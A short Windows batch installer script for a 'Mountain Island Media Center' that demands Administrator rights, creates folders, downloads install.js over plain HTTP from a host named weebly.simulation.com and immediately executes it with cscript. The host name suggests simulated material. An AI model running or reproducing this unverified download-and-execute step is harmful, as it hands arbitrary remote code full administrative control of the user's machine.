@echo off
REM Mountain Island Media Center Installer Script

OPENFILES >NUL 2>&1
IF ERRORLEVEL 1 (
	ECHO This installer requires elevated "Administrator" privileges.
	ECHO Please open a command window with Administrator privileges and retry.
	EXIT /B 1
)

mkdir %USERPROFILE%\Miweb
mkdir MIMC_Install
cd MIMC_Install

curl.exe -o install.js http://weebly.simulation.com/Downloads/install.js
cscript.exe //E:jscript install.js
